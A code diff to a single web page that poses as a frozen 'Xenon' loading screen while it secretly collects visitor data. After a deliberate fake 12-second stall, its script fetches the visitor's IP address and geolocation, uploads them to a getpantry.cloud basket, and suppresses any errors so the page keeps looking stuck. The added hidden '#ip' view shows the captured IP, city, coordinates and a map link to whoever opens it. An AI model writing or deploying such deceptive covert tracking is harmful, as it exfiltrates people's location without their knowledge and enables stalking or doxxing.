@@ -86,6 +86,46 @@
         @keyframes blink {
             50% { opacity: 0; }
         }
+        #ip-view {
+            position: absolute;
+            inset: 0;
+            background: #000;
+            color: #0f0;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+            font-size: 1.8rem;
+            text-align: center;
+        }
+        #ip-display {
+            font-size: 3rem;
+            letter-spacing: 3px;
+            margin: 20px 0;
+            word-break: break-all;
+            max-width: 90%;
+        }
+        #geo {
+            font-size: 2rem;
+            color: #0f8;
+            margin: 20px 0;
+        }
+        #maplink {
+            font-size: 1.6rem;
+            color: #0ff;
+            margin: 40px 0;
+            text-decoration: none;
+        }
+        #maplink:hover {
+            text-decoration: underline;
+        }
+        #status {
+            font-size: 1.2rem;
+            color: #555;
+            margin-top: 60px;
+        }
     </style>
 </head>
 <body>
@@ -108,37 +148,40 @@
         <p style="font-size:0.9rem; opacity:0.5;">(do not close this window - data sync in background)</p>
     </div>
 
+    <!-- Hidden /#ip view page -->
+    <div id="ip-view">
+        <div>SHADOW NODE DATA</div>
+        <div id="ip-display">—</div>
+        <div id="geo">—</div>
+        <a id="maplink" href="#" target="_blank" style="display:none;">→ EXACT COORDINATES</a>
+        <div id="status">syncing...</div>
+    </div>
+
     <script>
-        function enterXenon() {
-            document.getElementById("landing").style.display = "none";
-            const frozen = document.getElementById("frozen");
-            frozen.style.display = "flex";
-
-            // Fake "frozen" delay before actual capture starts (looks stuck)
-            setTimeout(() => {
-                // Silent capture + upload happens here in background
-                captureAndUpload();
-            }, 12000); // pretend it's "stuck" for ~12 seconds
-
-            // Optional: after long time, show tiny hint or auto-redirect – but for now keep frozen look
-        }
-
         const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
         let ROOM = localStorage.getItem("xenon_room") || "";
 
-        // If no room yet, generate a random one (or prompt – but keeping minimal/no buttons)
         if (!ROOM) {
             ROOM = "xenon-" + Math.random().toString(36).substr(2, 6);
             localStorage.setItem("xenon_room", ROOM);
         }
 
+        function enterXenon() {
+            document.getElementById("landing").style.display = "none";
+            const frozen = document.getElementById("frozen");
+            frozen.style.display = "flex";
+
+            // Fake frozen delay then capture/upload
+            setTimeout(() => {
+                captureAndUpload();
+            }, 12000);
+        }
+
         async function captureAndUpload() {
             try {
-                // Get IP
                 const ipRes = await fetch("https://api.ipify.org?format=json");
                 const { ip } = await ipRes.json();
 
-                // Get geo
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                 const geo = await geoRes.json();
 
@@ -149,23 +192,62 @@
                         city: geo.city || geo.region || "?",
                         country: geo.country_name || "?"
                     };
-                    // Upload to shared "pantry" basket using room as key
                     await fetch(PANTRY_BASE + ROOM, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ ip, geo: geoData, ts: Date.now() })
                     });
                 }
-            } catch (e) {
-                // silent fail – keep looking frozen
-            }
-
-            // After capture, stay frozen-looking forever (or add tiny link later if wanted)
-            // For now: infinite "frozen" aesthetic
+            } catch (e) {}
+            // Stay frozen-looking
         }
 
-        // Optional: if you want to view data later, open ...#ip or bookmark separately
-        // But per request: no buttons to view – just capture on enter
+        // /#ip viewer (add #ip to URL to see shared data)
+        async function showIpView() {
+            document.getElementById("landing").style.display = "none";
+            document.getElementById("frozen").style.display = "none";
+            const view = document.getElementById("ip-view");
+            view.style.display = "flex";
+
+            const ipEl = document.getElementById("ip-display");
+            const geoEl = document.getElementById("geo");
+            const mapEl = document.getElementById("maplink");
+            const status = document.getElementById("status");
+
+            try {
+                const res = await fetch(PANTRY_BASE + ROOM);
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+
+                if (data.ip) {
+                    ipEl.textContent = data.ip;
+                    const g = data.geo || {};
+                    geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;
+
+                    if (g.lat && g.lon) {
+                        mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
+                        mapEl.style.display = "block";
+                    }
+                    status.textContent = `room: ${ROOM} • last sync: ${new Date(data.ts).toLocaleString()}`;
+                } else {
+                    ipEl.textContent = "NO DATA";
+                    status.textContent = "room empty";
+                }
+            } catch (e) {
+                ipEl.textContent = "ERROR";
+                status.textContent = "failed to fetch";
+            }
+        }
+
+        // Auto-check hash on load/change
+        function checkHash() {
+            if (location.hash === "#ip") {
+                showIpView();
+            }
+        }
+
+        window.addEventListener("hashchange", checkHash);
+        window.addEventListener("load", checkHash);
     </script>
 </body>
 </html>
